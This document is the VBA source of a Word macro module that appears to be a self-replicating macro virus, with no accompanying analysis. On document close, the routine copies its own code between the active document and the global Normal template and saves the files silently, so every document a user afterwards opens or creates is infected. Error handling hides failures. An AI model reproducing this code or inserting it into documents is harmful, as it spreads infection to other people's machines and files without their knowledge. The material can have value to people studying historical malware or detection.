   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   On Error GoTo skam
   Options.VirusProtection = True
   SWLABS99
   skam:
   End Sub
   Private Sub SWLABS99()
   If Not ActiveDocument.VBProject.VBComponents(1).codemodule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
       For i = 1 To NormalTemplate.VBProject.VBComponents(1).codemodule.CountOfLines
           d = NormalTemplate.VBProject.VBComponents(1).codemodule.Lines(i, 1)
           If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
               While Mid(d, Len(d) - 1, 2) = " _"
                   i = i + 1
                   d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).codemodule.Lines(i, 1)
               Wend
               ActiveDocument.VBProject.VBComponents(1).codemodule.InsertLines i * 2, d
           End If
       Next i
       ActiveDocument.SaveAs AddToRecentFiles:=False
   Else
   If Not NormalTemplate.VBProject.VBComponents(1).codemodule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
       For i = 1 To ActiveDocument.VBProject.VBComponents(1).codemodule.CountOfLines
           d = ActiveDocument.VBProject.VBComponents(1).codemodule.Lines(i, 1)
           If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
               While Mid(d, Len(d) - 1, 2) = " _"
                   i = i + 1
                   d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).codemodule.Lines(i, 1)
               Wend
               NormalTemplate.VBProject.VBComponents(1).codemodule.InsertLines i * 2, d
           End If
       Next i
       NormalTemplate.Save
   End If
   End If
   End Sub
